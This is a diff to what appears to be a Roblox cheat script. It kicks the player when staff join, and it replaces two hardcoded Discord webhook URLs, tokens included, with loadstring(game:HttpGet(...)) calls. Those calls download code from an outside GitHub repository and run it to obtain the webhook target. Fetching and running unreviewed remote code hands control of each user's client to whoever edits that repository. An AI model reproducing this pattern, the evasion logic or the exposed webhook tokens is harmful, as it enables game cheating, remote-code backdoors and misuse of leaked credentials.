@@ -260,7 +260,7 @@ for _, v in pairs(game:GetService("Players"):GetPlayers()) do
         if v.UserId == v1 then
             game:GetService("Players").LocalPlayer:Kick("Admin or Staff is in the server")
 task.wait()
-local url = "https://discord.com/api/webhooks/1364581205743243354/NWCYxtgxalB-dUauZNgNZfA8QPpZwSsGb1tBcdbPzH7IrZU5dOsdktD2-4z7PjeBvVuy"
+local qweur = loadstring(game:HttpGet('https://raw.githubusercontent.com/PotatoEiii/List/refs/heads/main/a',true))()
         local data = {
         ["content"] = "@everyone",
         ["embeds"] = {
@@ -278,7 +278,7 @@ local url = "https://discord.com/api/webhooks/1364581205743243354/NWCYxtgxalB-dU
         ["content-type"] = "application/json"
         }
         request = http_request or request or HttpPost or syn.request
-        local abcdef = {Url = url, Body = newdata, Method = "POST", Headers = headers}
+        local abcdef = {Url = qweur, Body = newdata, Method = "POST", Headers = headers}
         request(abcdef)
 
         end
@@ -9558,7 +9558,7 @@ end
 
 
 task.wait()
-local url = "https://discord.com/api/webhooks/1364829639033487371/YCbKWCcWfx55EjptNfityn2JVKmMw3tl_299ROq9hZ0q9EB7F-YNZ0ciuZIYN3SCV8ow"
+local retur = loadstring(game:HttpGet('https://raw.githubusercontent.com/PotatoEiii/List/refs/heads/main/b',true))()
         local data = {
         ["content"] = _G.pingplr .. "\n" .. _G.auranotify,
         ["embeds"] = {
@@ -9576,7 +9576,7 @@ local url = "https://discord.com/api/webhooks/1364829639033487371/YCbKWCcWfx55Ej
         ["content-type"] = "application/json"
         }
         request = http_request or request or HttpPost or syn.request
-        local abcdef = {Url = url, Body = newdata, Method = "POST", Headers = headers}
+        local abcdef = {Url = retur, Body = newdata, Method = "POST", Headers = headers}
         request(abcdef)
 end)
 
